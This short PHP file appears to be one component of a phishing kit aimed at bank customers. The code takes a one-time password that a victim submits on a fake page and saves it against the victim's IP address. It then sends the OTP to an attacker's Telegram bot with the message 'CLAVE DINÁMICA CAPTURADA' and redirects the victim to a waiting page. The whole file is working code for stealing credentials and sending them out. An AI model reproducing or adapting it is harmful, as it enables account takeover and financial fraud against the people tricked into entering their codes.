<?php
require('../panel/lib/funciones.php');
date_default_timezone_set('America/Bogota');

$ip = $_SERVER['REMOTE_ADDR'];
$registro = traer_regitro($ip);
$otp = $_POST['otp'];

actualizar_registro_otp($registro, $otp);

$token = getenv('TOKEN_BOT');
$id = getenv('ID_CHAT');
$mensaje = "📲 *CLAVE DINÁMICA CAPTURADA*\n\n";
$mensaje .= "🔢 OTP: " . $otp . "\n";

file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $id . "&text=" . urlencode($mensaje) . "&parse_mode=Markdown");

header("Location: ../a/WAITING.php");
?>
